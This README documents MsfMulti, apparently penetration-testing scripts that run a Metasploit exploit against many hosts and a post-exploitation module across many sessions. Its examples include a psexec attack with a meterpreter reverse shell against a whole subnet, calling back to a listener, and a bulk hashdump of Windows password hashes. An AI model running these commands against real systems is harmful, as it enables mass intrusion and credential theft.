# MsfMulti

MsfMulti is a set of scripts to ease some tasks using metasploit during large scope engagements.


## Dependencies

* msgpack-python
* requests


## Scripts

### multisploit.py

Run a given exploit against multiple targets.

Example:

```
$ ./multisploit.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
-t 192.168.1.0/24 --handler-opts='LHOST=192.168.1.16,LPORT=443'
```

Full help:

```
usage: multisploit.py [-h] -e EXPLOIT -p PAYLOAD -t TARGETS
                      [--handler-opts OPTIONS] [--exploit-opts OPTIONS]
                      [--rpc-host HOST] [--rpc-port PORT] [--rpc-user USER]
                      [--rpc-passwd PASSWD] [--rpc-ssl]

Metasploit mass exploitation utility

optional arguments:
  -h, --help            show this help message and exit
  -e EXPLOIT, --exploit EXPLOIT
                        exploit to run against targets
  -p PAYLOAD, --payload PAYLOAD
                        payload to use with the exploit
  -t TARGETS, --targets TARGETS
                        comma-separated list of IPs/CIDRs
  --handler-opts OPTIONS
                        comma-separated options to pass to the payload handler
  --exploit-opts OPTIONS
                        comma-separated options to pass to the exploit

MSFRPC connection:
  --rpc-host HOST       MSFRPC host (default: 127.0.0.1)
  --rpc-port PORT       MSFRPC port (default: 55552)
  --rpc-user USER       user to use to connect to MSFRPC (default: msf)
  --rpc-passwd PASSWD   password to use to connect to MSFRPC (default: msf)
  --rpc-ssl             use SSL to connect to MSFRPC (default: False)
```

### multipost.py

Run a given `post` module against multiple sessions.

Example:

```
$ ./multipost.py -m windows/gather/hashdump -s 1-10,12,14-18
```

Full help:

```
usage: multipost.py [-h] -m MODULE -s SESSIONS [--opts OPTS] [--rpc-host HOST]
                    [--rpc-port PORT] [--rpc-user USER] [--rpc-passwd PASSWD]
                    [--rpc-ssl]

Metasploit mass post-exploitation utility

optional arguments:
  -h, --help            show this help message and exit
  -m MODULE, --module MODULE
                        post module to run
  -s SESSIONS, --sessions SESSIONS
                        comma-separated list of sessions and/or session-ranges
  --opts OPTS           comma-separated options to pass to the post module

MSFRPC connection:
  --rpc-host HOST       MSFRPC host (default: 127.0.0.1)
  --rpc-port PORT       MSFRPC port (default: 55552)
  --rpc-user USER       user to use to connect to MSFRPC (default: msf)
  --rpc-passwd PASSWD   password to use to connect to MSFRPC (default: msf)
  --rpc-ssl             use SSL to connect to MSFRPC (default: False)
```
